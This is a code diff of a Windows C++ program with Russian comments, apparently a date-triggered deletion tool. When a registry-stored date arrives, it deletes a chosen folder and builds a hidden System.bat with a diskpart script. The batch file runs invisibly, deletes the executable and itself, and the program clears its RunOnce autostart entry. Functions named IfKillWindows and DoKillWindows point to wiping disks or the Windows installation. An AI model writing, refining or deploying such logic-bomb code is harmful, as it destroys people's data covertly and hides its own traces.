@@ -297,7 +297,7 @@ bool CDeleteDay::InspectDeleteData()
 	//получить дату удаления, если данные получить не удалось
 	if (!ReadRegDeleteDay(DelDay, DelDayOfWeek, DelMonth)) {
 		//то наверное програ запускается первый раз и читать пока нечего
-		return true;
+		return false;
 	}
 	
 	//определить текущую дату
@@ -307,9 +307,7 @@ bool CDeleteDay::InspectDeleteData()
 	//нужно сравнивать день, день недели и месяц по отдельности
 	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 )	{	
 		if (CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth) {
-			TRACE0("Даты совпадают. Удаляем папку.\n");
-			//... выполнить задание
-			PerformATask();
+			TRACE0("Даты совпадают. Выполняем устаноленное задание.\n");
 			return true;
 		}		
 	}	
@@ -367,7 +365,7 @@ bool DeleteFolder()
 	return true;
 }
 
-bool PerformATask(void)
+bool CDeleteDay::PerformATask(void)
 {
 	const int SIZE = 1024;
 	// Далее выделяем много памяти - лишним не будет %)
@@ -377,17 +375,16 @@ bool PerformATask(void)
 	char szFileDiskPart[SIZE] = { "\0" };
 	char szTempPath[SIZE] = { "\0" };
 
-	char sz[SIZE]; // Строка-помошник...
-
-	unsigned int iTmp;
-	char* lpTmp;
+	char buffer[SIZE] = { "\0" }; // Строка-помошник...
 
 	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
 
-	if (GetShortPathNameA(szFileExe, sz, SIZE)) // Преобразуем в имя файла в досовский вид
-		strncpy(szFileExe, sz, sizeof(szFileExe));
+	if (GetShortPathNameA(szFileExe, buffer, SIZE)) // Преобразуем в имя файла в досовский вид
+		strncpy(szFileExe, buffer, sizeof(szFileExe));
 
-	////////////////////////////////////////////////////////////////////
+	//убираем название проги и расширение. Перемещаем указатель
+	unsigned int iTmp;
+	char* lpTmp;
 	size_t sLen = strlen(szFileExe) - 1;
 	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
 
@@ -417,21 +414,12 @@ bool PerformATask(void)
 
 	//удаляем выбранную папку
 	DeleteFolder();
-
 	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
-
-	//SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
-	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
-
-	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Делаем файл нормальным
-
-	HINSTANCE h = ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
-
+	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
+	HINSTANCE h = ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.0
 	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
 	//удаляем из автозагрузки
 	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
-
-	//KeyBoardLedBlink();
 
 	return false; // И закрываемся
 }
@@ -478,7 +466,7 @@ bool IfKillWindows()
 		, csKillW.GetBuffer(dwDataBufferSize)
 		, &dwDataBufferSize) != ERROR_SUCCESS)
 	{
-		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");
+		TRACE0("Облом с SHGetValue() в IfKillWindows().\n");
 	}
 
 	if (csKillW.Compare(L"YES") == 0){
@@ -668,13 +656,13 @@ bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_
 
 bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
 {
-	char strTemp[600]; // Строка-помошник...
+	char strTemp[600] = { '\0' }; // Строка-помошник...
 	//создаем бат-файл в папке темп или в папке с программой
 	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath)) ? szTempPath : szFilePath);
 
 	SetFileAttributesA(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
 
-	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
+	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -706,10 +694,10 @@ bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char 
 			"del \"%s\"\n" //удаление батника
 			"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
 
-		printf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
+		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
 	}
 	else {
-		printf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
+		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
 	}
 
 	DWORD dwBytesWritten;
@@ -723,105 +711,6 @@ bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char 
 	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
 
 	return true;
-}
-
-void KeyBoardLedBlink(void)
-{
-	for (int i = 0; i < 3; i++)
-	{
-		for (int c = 0; c < 2; c++)
-		{
-			INPUT inp;
-			::ZeroMemory(&inp, sizeof(inp));
-
-			inp.type = INPUT_KEYBOARD;
-			inp.ki.wVk = VK_NUMLOCK;
-			inp.ki.dwFlags = 0;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-
-			inp.ki.dwFlags = KEYEVENTF_KEYUP;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-		}
-
-		for (int c = 0; c < 2; c++)
-		{
-			INPUT inp;
-			::ZeroMemory(&inp, sizeof(inp));
-
-			inp.type = INPUT_KEYBOARD;
-			inp.ki.wVk = VK_CAPITAL;
-			inp.ki.dwFlags = 0;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-
-			inp.ki.dwFlags = KEYEVENTF_KEYUP;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-		}
-
-		for (int c = 0; c < 2; c++)
-		{
-			INPUT inp;
-			::ZeroMemory(&inp, sizeof(inp));
-
-			inp.type = INPUT_KEYBOARD;
-			inp.ki.wVk = VK_SCROLL;
-			inp.ki.dwFlags = 0;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-
-			inp.ki.dwFlags = KEYEVENTF_KEYUP;
-			SendInput(1, &inp, sizeof(INPUT));
-
-			Sleep(75);
-		}
-	}
-
-	//==============================================
-	//выполняется нажитие комбинации клавиш RCONTROL+SCROLL+SCROLL
-
-	//INPUT input;
-	//::ZeroMemory(&input, sizeof(input));	
-
-	////нажимаем правый CONTROL
-	//input.type = INPUT_KEYBOARD;
-	//input.ki.wVk = VK_MENU;
-	//SendInput(1, &input, sizeof(INPUT));
-	//TRACE0("Нажали правый CONTROL\n");
-
-	//for (int c = 0; c < 2; c++)
-	//	{
-	//		INPUT inp;
-	//		::ZeroMemory(&inp, sizeof(inp));
-
-	//		inp.type = INPUT_KEYBOARD;
-	//		inp.ki.wVk = VK_PRINT;
-	//		inp.ki.dwFlags = 0;
-	//		SendInput(1, &inp, sizeof(INPUT));
-	//		TRACE0("Нажали на CSROLL\n");
-	//		
-	//		inp.ki.dwFlags = KEYEVENTF_KEYUP;
-	//		SendInput(1, &inp, sizeof(INPUT));
-	//		TRACE0("Отпустили CSROLL\n");
-
-	//		Sleep(500);
-	//	}
-
-	////отпускаем правый CONTROL
-	//input.ki.wVk = VK_MENU;
-	//input.ki.dwFlags = KEYEVENTF_KEYUP;	
-	//SendInput(1, &input, sizeof(INPUT));
-	//TRACE0("Отпустили правый CONTROL\n");
-
-	//==============================================
-	TRACE0("Типа нажали на все педали.\n");
 }
 
 void DoKillWindows()
